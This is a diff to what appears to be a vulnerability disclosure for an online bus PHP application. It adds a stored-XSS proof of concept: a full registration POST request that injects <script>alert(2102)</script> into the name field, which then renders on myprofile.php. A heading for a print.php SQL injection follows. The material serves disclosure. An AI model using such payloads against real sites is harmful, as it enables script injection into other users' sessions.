@@ -325,6 +325,38 @@ in myprofile.php source code
 
 Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
 
+POC:
+
+regist new user
+
+name have xss payload
+
+```
+POST /register_insert.php HTTP/1.1
+Host: onlinebus
+Content-Length: 117
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://onlinebus
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://onlinebus/register.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+name=<script>alert(2102)</script>&email=qqq%40qq.com&Gender=M&dob=2002-02-02&password=123456&phone=2&register_submit=
+```
+
+open myprofile.php
+
+![1706533735063](https://github.com/gtqbhksl/weekdays_something/assets/113713406/78f12399-b215-4974-8433-33614b1b4f3c)
+
+
+
+
 # 7. print.php sql injection
 
 ![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/b7a2b3d6-2f29-4969-b679-9f6486b8936d)
